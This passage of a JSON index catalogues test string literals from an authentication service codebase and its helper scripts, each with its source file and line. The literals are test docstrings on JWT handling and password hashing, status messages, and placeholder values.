      "value": "AuthDatabaseManager should detect problematic staging configuration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:336"
      ]
    },
    "AuthDatabaseManager should validate staging readiness with correct configuration": {
      "value": "AuthDatabaseManager should validate staging readiness with correct configuration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:320"
      ]
    },
    "AuthSecretLoader correctly detected missing": {
      "value": "AuthSecretLoader correctly detected missing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:416"
      ]
    },
    "AuthSecretLoader.": {
      "value": "AuthSecretLoader.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:405",
        "auth_service/tests/test_critical_oauth_environment_failures.py:409"
      ]
    },
    "AuthSessionFactory": {
      "value": "AuthSessionFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:16"
      ]
    },
    "AuthTestBase": {
      "value": "AuthTestBase",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/__init__.py:14"
      ]
    },
    "AuthTestClient": {
      "value": "AuthTestClient",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/__init__.py:18"
      ]
    },
    "AuthTestEnvironment": {
      "value": "AuthTestEnvironment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/__init__.py:9"
      ]
    },
    "AuthTestMixin": {
      "value": "AuthTestMixin",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/__init__.py:18"
      ]
    },
    "AuthTestUtils": {
      "value": "AuthTestUtils",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/__init__.py:15"
      ]
    },
    "AuthUserFactory": {
      "value": "AuthUserFactory",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/__init__.py:14"
      ]
    },
    "Authentication Token Generation Tests - Business Impact\n\nSecurity Foundation: Core Authentication Infrastructure\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance  \n- Foundation for all authentication and authorization in the platform\n\nTechnical Excellence:\n- JWT token generation: access, refresh, and service tokens with proper structure\n- Token claims validation: user ID, email, permissions, and metadata\n- Token timing: consistent generation performance and unique token creation\n- Token type consistency: standardized structure across all token types\n- Expiry configuration: proper token lifetime management for security\n\nPlatform Security:\n- Platform: Secure token generation foundation for all authentication\n- Security: JWT structure compliance for SOC2/GDPR requirements\n- Microservices: Service token generation for inter-service communication\n- Performance: Fast token generation (<1s) for responsive authentication\n- Consistency: Standardized token structure across all authentication flows": {
      "value": "Authentication Token Generation Tests - Business Impact\n\nSecurity Foundation: Core Authentication Infrastructure\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance  \n- Foundation for all authentication and authorization in the platform\n\nTechnical Excellence:\n- JWT token generation: access, refresh, and service tokens with proper structure\n- Token claims validation: user ID, email, permissions, and metadata\n- Token timing: consistent generation performance and unique token creation\n- Token type consistency: standardized structure across all token types\n- Expiry configuration: proper token lifetime management for security\n\nPlatform Security:\n- Platform: Secure token generation foundation for all authentication\n- Security: JWT structure compliance for SOC2/GDPR requirements\n- Microservices: Service token generation for inter-service communication\n- Performance: Fast token generation (<1s) for responsive authentication\n- Consistency: Standardized token structure across all authentication flows",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:282"
      ]
    },
    "Authentication Token Generation Tests - JWT token creation and structure validation\n\nTests JWT token generation with various claims, token types, and security configurations.\nCritical for ensuring secure token creation in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance\n- Foundation for all authentication and authorization in the platform\n\nTest Coverage:\n- Basic access token generation\n- Access tokens with permission claims\n- Refresh token generation with proper structure\n- Service token generation for microservice communication\n- Token structure validation and security compliance": {
      "value": "Authentication Token Generation Tests - JWT token creation and structure validation\n\nTests JWT token generation with various claims, token types, and security configurations.\nCritical for ensuring secure token creation in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance\n- Foundation for all authentication and authorization in the platform\n\nTest Coverage:\n- Basic access token generation\n- Access tokens with permission claims\n- Refresh token generation with proper structure\n- Service token generation for microservice communication\n- Token structure validation and security compliance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:1"
      ]
    },
    "Authentication Token Security Tests - Business Impact\n\nSecurity Foundation: Critical Security Protection ($100K+ MRR)\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTechnical Excellence:\n- Signature verification: tampered token detection and integrity protection\n- Claims extraction: secure claims validation and privilege boundaries\n- Attack prevention: 'none' algorithm, timing attacks, and signature tampering\n- Revocation support: user-based and time-based revocation mechanisms\n- Security boundaries: token type enforcement and privilege separation\n- Timing resistance: consistent validation times to prevent timing attacks\n\nEnterprise Security:\n- Platform: Comprehensive security foundation for enterprise authentication\n- Compliance: Security validation for SOC2/GDPR enterprise requirements\n- Attack Prevention: Protection against common JWT security vulnerabilities\n- Integrity: Signature and claims validation maintains authentication trust\n- Boundaries: Security separation between token types and privileges": {
      "value": "Authentication Token Security Tests - Business Impact\n\nSecurity Foundation: Critical Security Protection ($100K+ MRR)\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTechnical Excellence:\n- Signature verification: tampered token detection and integrity protection\n- Claims extraction: secure claims validation and privilege boundaries\n- Attack prevention: 'none' algorithm, timing attacks, and signature tampering\n- Revocation support: user-based and time-based revocation mechanisms\n- Security boundaries: token type enforcement and privilege separation\n- Timing resistance: consistent validation times to prevent timing attacks\n\nEnterprise Security:\n- Platform: Comprehensive security foundation for enterprise authentication\n- Compliance: Security validation for SOC2/GDPR enterprise requirements\n- Attack Prevention: Protection against common JWT security vulnerabilities\n- Integrity: Signature and claims validation maintains authentication trust\n- Boundaries: Security separation between token types and privileges",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:434"
      ]
    },
    "Authentication Token Security Tests - Security validation and attack prevention\n\nTests JWT token security features including signature verification, tampering detection,\nrevocation mechanisms, and comprehensive security boundary enforcement.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Security Compliance | Impact: Critical Security\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTest Coverage:\n- JWT signature verification and tampering detection\n- Token revocation mechanisms and security lifecycle\n- Claims extraction and security validation\n- Attack prevention and security boundary enforcement\n- Security compliance validation for enterprise requirements": {
      "value": "Authentication Token Security Tests - Security validation and attack prevention\n\nTests JWT token security features including signature verification, tampering detection,\nrevocation mechanisms, and comprehensive security boundary enforcement.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Security Compliance | Impact: Critical Security\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTest Coverage:\n- JWT signature verification and tampering detection\n- Token revocation mechanisms and security lifecycle\n- Claims extraction and security validation\n- Attack prevention and security boundary enforcement\n- Security compliance validation for enterprise requirements",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:1"
      ]
    },
    "Authentication Token Validation Tests - Business Impact\n\nSecurity Foundation: Authentication Integrity Protection\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTechnical Excellence:\n- Token validation: comprehensive validation for access, refresh, and service tokens\n- Security boundaries: proper token type enforcement and access control\n- Signature verification: tampered token detection and integrity protection\n- Expiry validation: time-based security and token lifecycle management\n- Performance validation: fast token validation (<10ms average) for responsive auth\n- Concurrent validation: thread-safe validation for production scalability\n\nPlatform Security:\n- Platform: Secure token validation foundation for all authentication flows\n- Security: Comprehensive validation prevents security vulnerabilities and attacks\n- Performance: Fast validation ensures responsive authentication experience\n- Boundaries: Token type enforcement prevents privilege escalation\n- Integrity: Signature and timing validation maintains authentication trust": {
      "value": "Authentication Token Validation Tests - Business Impact\n\nSecurity Foundation: Authentication Integrity Protection\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTechnical Excellence:\n- Token validation: comprehensive validation for access, refresh, and service tokens\n- Security boundaries: proper token type enforcement and access control\n- Signature verification: tampered token detection and integrity protection\n- Expiry validation: time-based security and token lifecycle management\n- Performance validation: fast token validation (<10ms average) for responsive auth\n- Concurrent validation: thread-safe validation for production scalability\n\nPlatform Security:\n- Platform: Secure token validation foundation for all authentication flows\n- Security: Comprehensive validation prevents security vulnerabilities and attacks\n- Performance: Fast validation ensures responsive authentication experience\n- Boundaries: Token type enforcement prevents privilege escalation\n- Integrity: Signature and timing validation maintains authentication trust",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:344"
      ]
    },
    "Authentication Token Validation Tests - JWT token validation and security verification\n\nTests JWT token validation scenarios including signature verification, expiry checking,\ntoken type validation, and security boundary enforcement in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Core Security\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTest Coverage:\n- Valid token validation across different token types\n- Invalid token type rejection and security boundaries\n- Token expiry validation and time-based security\n- Signature verification and tampering detection\n- Token structure validation and malformed token handling": {
      "value": "Authentication Token Validation Tests - JWT token validation and security verification\n\nTests JWT token validation scenarios including signature verification, expiry checking,\ntoken type validation, and security boundary enforcement in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Core Security\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTest Coverage:\n- Valid token validation across different token types\n- Invalid token type rejection and security boundaries\n- Token expiry validation and time-based security\n- Signature verification and tampering detection\n- Token structure validation and malformed token handling",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:1"
      ]
    },
    "Authentication failed during background operation": {
      "value": "Authentication failed during background operation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:204"
      ]
    },
    "Authentication service tests": {
      "value": "Authentication service tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:83"
      ]
    },
    "Authentication test failed:": {
      "value": "Authentication test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:258"
      ]
    },
    "Authentication:": {
      "value": "Authentication:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:92",
        "scripts/test_staging_config.py:119"
      ]
    },
    "Authorization": {
      "value": "Authorization",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1127",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1373",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1426",
        "auth_service/tests/utils/test_client.py:38",
        "scripts/test_cold_start_e2e.py:274",
        "scripts/test_cold_start_e2e.py:321",
        "scripts/test_cold_start_e2e.py:383",
        "scripts/test_oauth_local.py:303",
        "scripts/test_staging_deployment.py:105",
        "scripts/test_staging_deployment.py:107"
      ]
    },
    "Authorization code reuse attack detected": {
      "value": "Authorization code reuse attack detected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:261"
      ]
    },
    "Auto-fix functionality not implemented yet.": {
      "value": "Auto-fix functionality not implemented yet.",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:387"
      ]
    },
    "Auto-fix linting issues": {
      "value": "Auto-fix linting issues",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:408"
      ]
    },
    "Auto-fix operations can break your tests!": {
      "value": "Auto-fix operations can break your tests!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:950"
      ]
    },
    "Auto-generated by Autonomous Test Reviewer with Ultra-Thinking\nGenerated:": {
      "value": "Auto-generated by Autonomous Test Reviewer with Ultra-Thinking\nGenerated:",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:101"
      ]
    },
    "Auto-split window size in minutes (default: 15)": {
      "value": "Auto-split window size in minutes (default: 15)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:809"
      ]
    },
    "Auto-splitting is experimental - manual review required": {
      "value": "Auto-splitting is experimental - manual review required",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:400"
      ]
    },
    "Automated Test Size Violation Fixer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity - Enable test runner to function, unblock development pipeline\n- Value Impact: Restores test execution capability, prevents regression accumulation\n- Strategic Impact: $50K+ monthly dev velocity protection through working test infrastructure\n\nThis script automatically fixes test size violations by:\n1. Splitting oversized test files (>300 lines) into focused modules\n2. Extracting common fixtures and utilities\n3. Breaking large test functions (>8 lines) into focused tests\n4. Preserving all test functionality while improving maintainability": {
      "value": "Automated Test Size Violation Fixer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity - Enable test runner to function, unblock development pipeline\n- Value Impact: Restores test execution capability, prevents regression accumulation\n- Strategic Impact: $50K+ monthly dev velocity protection through working test infrastructure\n\nThis script automatically fixes test size violations by:\n1. Splitting oversized test files (>300 lines) into focused modules\n2. Extracting common fixtures and utilities\n3. Breaking large test functions (>8 lines) into focused tests\n4. Preserving all test functionality while improving maintainability",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:2"
      ]
    },
    "Automated test fix loop script.\n\nThis script runs test suite iterations and fixes issues automatically.": {
      "value": "Automated test fix loop script.\n\nThis script runs test suite iterations and fixes issues automatically.",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:1"
      ]
    },
    "Automated test thread": {
      "value": "Automated test thread",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:327"
      ]
    },
    "Automatic function refactoring is not supported": {
      "value": "Automatic function refactoring is not supported",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:625"
      ]
    },
    "Automatically fix identified issues": {
      "value": "Automatically fix identified issues",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:273"
      ]
    },
    "Automatically fix test size violations": {
      "value": "Automatically fix test size violations",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:717"
      ]
    },
    "Autonomous Test Review System - Entry Point\nWrapper script for the autonomous test review system": {
      "value": "Autonomous Test Review System - Entry Point\nWrapper script for the autonomous test review system",
      "category": "test_literals",
      "locations": [
        "scripts/test_autonomous_review.py:2"
      ]
    },
    "Autonomous Test Review System - Main Reviewer\nMain autonomous test reviewer class for orchestrating analysis and improvements": {
      "value": "Autonomous Test Review System - Main Reviewer\nMain autonomous test reviewer class for orchestrating analysis and improvements",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:2"
      ]
    },
    "Autonomous Test Review System - Test Generator\nIntelligent test generation and modernization capabilities": {
      "value": "Autonomous Test Review System - Test Generator\nIntelligent test generation and modernization capabilities",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:2"
      ]
    },
    "Available CLI tools:": {
      "value": "Available CLI tools:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:175"
      ]
    },
    "Available URLs:": {
      "value": "Available URLs:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:64"
      ]
    },
    "Available categories:": {
      "value": "Available categories:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:217"
      ]
    },
    "Average Business Value Score:": {
      "value": "Average Business Value Score:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:738"
      ]
    },
    "Average Duration:": {
      "value": "Average Duration:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:906"
      ]
    },
    "Average Success Rate:": {
      "value": "Average Success Rate:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:908"
      ]
    },
    "Average validation time:": {
      "value": "Average validation time:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:215"
      ]
    },
    "B": {
      "value": "B",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:63"
      ]
    },
    "BACKEND_PORT": {
      "value": "BACKEND_PORT",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:255"
      ]
    },
    "BACKEND_URL": {
      "value": "BACKEND_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:46",
        "auth_service/tests/config/test_settings.py:193",
        "scripts/start_test_services.py:153",
        "scripts/unified_test_runner.py:183",
        "scripts/unified_test_runner.py:183"
      ]
    },
    "BASE_SERVICE": {
      "value": "BASE_SERVICE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:228"
      ]
    },
    "BASE_URL": {
      "value": "BASE_URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:27"
      ]
    },
    "BATCH PROCESSING COMPLETE": {
      "value": "BATCH PROCESSING COMPLETE",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:378"
      ]
    },
    "BATCH TEST FIXER": {
      "value": "BATCH TEST FIXER",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:345"
      ]
    },
    "BUSINESS VALUE TEST COVERAGE SUMMARY": {
      "value": "BUSINESS VALUE TEST COVERAGE SUMMARY",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:734"
      ]
    },
    "BVJ:": {
      "value": "BVJ:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:147"
      ]
    },
    "BVJ: JWT Validation Tests\n\nSegment: Enterprise & Growth (Critical security infrastructure)\nBusiness Goal: Zero authentication vulnerabilities, secure token validation\nValue Impact:\n- Prevents JWT-based security attacks (signature tampering, algorithm confusion)\n- Enables secure token-based authentication for enterprise features\n- Supports proper token lifecycle management and revocation\n- Protects against expired token usage and claim validation bypasses\n\nStrategic/Revenue Impact: Authentication security foundation for enterprise sales\nCritical for SOC2 compliance and security audit requirements": {
      "value": "BVJ: JWT Validation Tests\n\nSegment: Enterprise & Growth (Critical security infrastructure)\nBusiness Goal: Zero authentication vulnerabilities, secure token validation\nValue Impact:\n- Prevents JWT-based security attacks (signature tampering, algorithm confusion)\n- Enables secure token-based authentication for enterprise features\n- Supports proper token lifecycle management and revocation\n- Protects against expired token usage and claim validation bypasses\n\nStrategic/Revenue Impact: Authentication security foundation for enterprise sales\nCritical for SOC2 compliance and security audit requirements",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:368"
      ]
    },
    "Backed up": {
      "value": "Backed up",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:763"
      ]
    },
    "Backend API Health": {
      "value": "Backend API Health",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:84"
      ]
    },
    "Backend Auth Required": {
      "value": "Backend Auth Required",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:72"
      ]
    },
    "Backend Health": {
      "value": "Backend Health",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:67",
        "scripts/test_staging_env.py:145"
      ]
    },
    "Backend Integration": {
      "value": "Backend Integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:78"
      ]
    },
    "Backend Service": {
      "value": "Backend Service",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:167"
      ]
    },
    "Backend Service: [green]✓ Healthy[/green]": {
      "value": "Backend Service: [green]✓ Healthy[/green]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:112"
      ]
    },
    "Backend Service: [red]✗ Not reachable -": {
      "value": "Backend Service: [red]✗ Not reachable -",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:116"
      ]
    },
    "Backend Service: [red]✗ Unhealthy (": {
      "value": "Backend Service: [red]✗ Unhealthy (",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:113"
      ]
    },
    "Backend Startup Tests": {
      "value": "Backend Startup Tests",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:87"
      ]
    },
    "Backend Tests:": {
      "value": "Backend Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:115"
      ]
    },
    "Backend URL: [cyan]": {
      "value": "Backend URL: [cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:437"
      ]
    },
    "Backend alone should not trigger production, got": {
      "value": "Backend alone should not trigger production, got",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:52"
      ]
    },
    "Backend health check failed:": {
      "value": "Backend health check failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:41"
      ]
    },
    "Backend integration test failed:": {
      "value": "Backend integration test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:77"
      ]
    },
    "Backend is healthy": {
      "value": "Backend is healthy",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:35"
      ]
    },
    "Backend must start before frontend": {
      "value": "Backend must start before frontend",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:101"
      ]
    },
    "Backend returned status": {
      "value": "Backend returned status",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:39"
      ]
    },
    "Backend service URL": {
      "value": "Backend service URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_integration.py:176"
      ]
    },
    "Backend service failed to start": {
      "value": "Backend service failed to start",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:118"
      ]
    },
    "Backend service tests": {
      "value": "Backend service tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:82"
      ]
    },
    "Backend should be in registry": {
      "value": "Backend should be in registry",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:339"
      ]
    },
    "Backend should have started": {
      "value": "Backend should have started",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:332"
      ]
    },
    "Backend should not start before auth is ready": {
      "value": "Backend should not start before auth is ready",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:112"
      ]
    },
    "Backend unhealthy:": {
      "value": "Backend unhealthy:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:37"
      ]
    },
    "Background task": {
      "value": "Background task",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:182",
        "auth_service/tests/test_graceful_shutdown_failures.py:184",
        "auth_service/tests/test_graceful_shutdown_failures.py:186",
        "auth_service/tests/test_graceful_shutdown_failures.py:191"
      ]
    },
    "Background tasks prevented clean shutdown, took": {
      "value": "Background tasks prevented clean shutdown, took",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:235"
      ]
    },
    "Backups stored in:": {
      "value": "Backups stored in:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1012"
      ]
    },
    "Bad file descriptor": {
      "value": "Bad file descriptor",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:59"
      ]
    },
    "Base Test Classes\nCommon functionality for auth service tests with proper setup and teardown.\nFollows 450-line limit with focused test infrastructure.": {
      "value": "Base Test Classes\nCommon functionality for auth service tests with proper setup and teardown.\nFollows 450-line limit with focused test infrastructure.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:1"
      ]
    },
    "Base URL": {
      "value": "Base URL",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:209"
      ]
    },
    "Base URL validation:": {
      "value": "Base URL validation:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:335"
      ]
    },
    "Base URL:": {
      "value": "Base URL:",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:241"
      ]
    },
    "Based on the analysis of your AI workload, I've identified several optimization opportunities.": {
      "value": "Based on the analysis of your AI workload, I've identified several optimization opportunities.",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:158"
      ]
    },
    "Basic Password Hashing and Verification Tests\n\nTests the core password hashing and verification functionality used throughout\nthe auth service. This ensures secure password handling for basic authentication.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure password hashing for all local authentication flows  \n- Validates password verification accuracy and prevents auth bypasses\n- Critical foundation for user account security and authentication integrity\n\nTest Coverage:\n- Password hashing with different lengths and complexity\n- Password verification for correct and incorrect passwords\n- Hash format consistency and security properties\n- Password strength validation and edge cases": {
      "value": "Basic Password Hashing and Verification Tests\n\nTests the core password hashing and verification functionality used throughout\nthe auth service. This ensures secure password handling for basic authentication.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure password hashing for all local authentication flows  \n- Validates password verification accuracy and prevents auth bypasses\n- Critical foundation for user account security and authentication integrity\n\nTest Coverage:\n- Password hashing with different lengths and complexity\n- Password verification for correct and incorrect passwords\n- Hash format consistency and security properties\n- Password strength validation and edge cases",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:1"
      ]
    },
    "Basic test setup verification\nEnsures test environment is working correctly": {
      "value": "Basic test setup verification\nEnsures test environment is working correctly",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_setup.py:1"
      ]
    },
    "Batch Test Fixer - Systematically fixes test failures\nProcesses tests in batches and either:\n1. Aligns tests with current code\n2. Implements missing functionality if tests are correct": {
      "value": "Batch Test Fixer - Systematically fixes test failures\nProcesses tests in batches and either:\n1. Aligns tests with current code\n2. Implements missing functionality if tests are correct",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:2"
      ]
    },
    "Batch fix known test issues and run test iterations.": {
      "value": "Batch fix known test issues and run test iterations.",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:2"
      ]
    },
    "Batch processing completed": {
      "value": "Batch processing completed",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:128"
      ]
    },
    "Bearer": {
      "value": "Bearer",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:208",
        "auth_service/tests/base/test_mixins.py:250",
        "auth_service/tests/base/test_mixins.py:259",
        "auth_service/tests/factories/token_factory.py:195",
        "auth_service/tests/factories/token_factory.py:219",
        "auth_service/tests/integration/test_auth_oauth_errors.py:48",
        "auth_service/tests/integration/test_auth_oauth_google.py:57",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:131",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:244",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:293"
      ]
    },
    "Bearer malformed-token": {
      "value": "Bearer malformed-token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:590"
      ]
    },
    "Bearer test": {
      "value": "Bearer test",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:105",
        "scripts/test_staging_deployment.py:107",
        "scripts/test_staging_deployment.py:109"
      ]
    },
    "Bearer test_token_123": {
      "value": "Bearer test_token_123",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:177"
      ]
    },
    "Blacklist check should return boolean": {
      "value": "Blacklist check should return boolean",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:156"
      ]
    },
    "Blacklisted token should be invalid": {
      "value": "Blacklisted token should be invalid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:58"
      ]
    },
    "Blacklisted user's refresh token should not work": {
      "value": "Blacklisted user's refresh token should not work",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:199"
      ]
    },
    "Blacklisting malformed token should not raise exception:": {
      "value": "Blacklisting malformed token should not raise exception:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:159"
      ]
    },
    "Both check threads should complete": {
      "value": "Both check threads should complete",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:255"
      ]
    },
    "Broken pipe during socket operation": {
      "value": "Broken pipe during socket operation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:93"
      ]
    },
    "Build frontend for production": {
      "value": "Build frontend for production",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:410"
      ]
    },
    "Building frontend...": {
      "value": "Building frontend...",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:298"
      ]
    },
    "Business Value Justification": {
      "value": "Business Value Justification",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:147"
      ]
    },
    "Business Value Test Index Generator\n\nScans the codebase to create a comprehensive index of all tests,\ncategorized by business value, customer tier, and coverage dimensions.": {
      "value": "Business Value Test Index Generator\n\nScans the codebase to create a comprehensive index of all tests,\ncategorized by business value, customer tier, and coverage dimensions.",
